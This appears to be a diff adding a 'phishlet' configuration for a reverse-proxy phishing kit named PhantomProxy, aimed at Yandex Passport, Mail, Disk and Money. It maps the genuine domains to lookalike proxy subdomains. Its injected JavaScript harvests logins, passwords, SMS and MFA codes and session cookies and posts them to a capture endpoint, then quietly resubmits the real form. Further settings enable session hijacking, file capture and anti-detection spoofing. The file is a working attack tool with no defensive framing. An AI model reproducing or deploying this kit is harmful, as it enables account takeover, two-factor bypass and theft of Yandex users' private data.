@@ -1,0 +1,275 @@
+# ============================================================================
+# Yandex Phishlet (Яндекс)
+# Полный перехват сессий Яндекс (Passport, Mail, Disk)
+# ============================================================================
+
+id: yandex
+name: Yandex (Passport/Mail/Disk/Money)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий Яндекс:
+  - Яндекс.Паспорт
+  - Яндекс.Почта
+  - Яндекс.Диск
+  - Яндекс.Деньги
+  - Яндекс.Метрика
+
+target:
+  primary: "passport.yandex.ru"
+  secondary:
+    - "passport.yandex.com"
+    - "mail.yandex.ru"
+    - "mail.yandex.com"
+    - "disk.yandex.ru"
+    - "disk.yandex.com"
+    - "money.yandex.ru"
+    - "ya.ru"
+    - "www.yandex.ru"
+
+sub_filters:
+  - type: "domain"
+    from: "passport.yandex.ru"
+    to: "passport.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "passport.yandex.com"
+    to: "passport-en.phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "mail.yandex.ru"
+    to: "mail.phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "disk.yandex.ru"
+    to: "disk.phantom-proxy.com"
+    priority: 4
+    
+  - type: "domain"
+    from: "money.yandex.ru"
+    to: "money.phantom-proxy.com"
+    priority: 5
+    
+  - type: "domain"
+    from: "ya.ru"
+    to: "ya.phantom-proxy.com"
+    priority: 6
+
+  - type: "domain"
+    from: "yastatic.net"
+    to: "static.phantom-proxy.com"
+    priority: 100
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Yandex phishlet loaded');
+    
+    const yandexCapture = {
+      // Перехват логина/пароля
+      captureCredentials: function(form) {
+        const login = form.querySelector('input[name="login"]')?.value || 
+                      form.querySelector('input[type="text"]')?.value || '';
+        const password = form.querySelector('input[type="password"]')?.value || '';
+        
+        if (login || password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'yandex_credentials',
+              login: login,
+              password: password,
+              url: window.location.href,
+              timestamp: Date.now()
+            })
+          });
+        }
+      },
+      
+      // Перехват SMS кода
+      captureSMS: function(input) {
+        const value = input.value;
+        if (value && value.length >= 4 && /^\d+$/.test(value)) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'yandex_sms',
+              code: value,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват Яндекс.Ключа
+      captureYandexKey: function(code) {
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'yandex_key',
+            code: code,
+            url: window.location.href
+          })
+        });
+      },
+      
+      // Перехват сессионных cookies
+      captureSession: function() {
+        const cookies = {
+          yandexuid: this.getCookie('yandexuid'),
+          yp: this.getCookie('yp'),
+          ys: this.getCookie('ys'),
+          Session_id: this.getCookie('Session_id'),
+          golden_shield: this.getCookie('golden_shield'),
+          my: this.getCookie('my')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'yandex_session',
+            cookies: cookies,
+            url: window.location.href,
+            userAgent: navigator.userAgent
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    // Наблюдатель за DOM
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+        mutation.addedNodes.forEach((node) => {
+          if (node.tagName === 'FORM') {
+            node.addEventListener('submit', (e) => {
+              e.preventDefault();
+              yandexCapture.captureCredentials(e.target);
+              // Отправляем форму оригинально через 500ms
+              setTimeout(() => e.target.submit(), 500);
+            });
+          }
+          
+          if (node.tagName === 'INPUT') {
+            if (node.name === 'sms_code' || node.name === 'mfa_code') {
+              node.addEventListener('input', (e) => {
+                yandexCapture.captureSMS(e.target);
+              });
+            }
+          }
+        });
+      });
+    });
+    
+    observer.observe(document.body, { childList: true, subtree: true });
+    
+    // Захват при загрузке
+    window.addEventListener('load', () => {
+      yandexCapture.captureSession();
+    });
+    
+    // Скрытие
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    
+  })();
+
+triggers:
+  - name: "yandex_login"
+    path_regex: "/authorization|/login|/auth"
+    actions:
+      - type: "inject_js"
+        payload: "yandex_login.js"
+      - type: "capture_form"
+        fields: ["login", "passwd", "password", "passwd2"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "yandex_sms"
+    path_regex: "/sms|/mfa|/verification"
+    actions:
+      - type: "capture_form"
+        fields: ["sms_code", "mfa_code", "code", "verification_code"]
+      - type: "wait_for_input"
+        timeout: 120
+        
+  - name: "yandex_mail"
+    host_regex: "mail.yandex"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["yandexuid", "yp", "ys", "Session_id"]
+      - type: "session_hijack"
+        enabled: true
+        
+  - name: "yandex_disk"
+    host_regex: "disk.yandex"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["yandexuid", "yp", "Session_id"]
+      - type: "capture_files"
+        enabled: true
+
+cookies:
+  critical:
+    - "yandexuid"
+    - "yp"
+    - "ys"
+    - "Session_id"
+    - "golden_shield"
+    
+  session:
+    - "my"
+    - "i"
+    - "yabs-sid"
+    
+  additional:
+    - "yandex_metrica"
+    - "ymex"
+    - "ymu"
+
+headers:
+  - "Authorization"
+  - "X-Yandex-UID"
+  - "X-Yandex-Fingerprint"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+  timezone_spoof: "Europe/Moscow"
+  language_spoof: "ru-RU"
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+  enable_brotli: true
+
+ssl:
+  min_version: "TLS1.2"
+  cipher_suites:
+    - "TLS_AES_256_GCM_SHA384"
+    - "TLS_CHACHA20_POLY1305_SHA256"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/yandex/"
+  log_timezone: "Europe/Moscow"
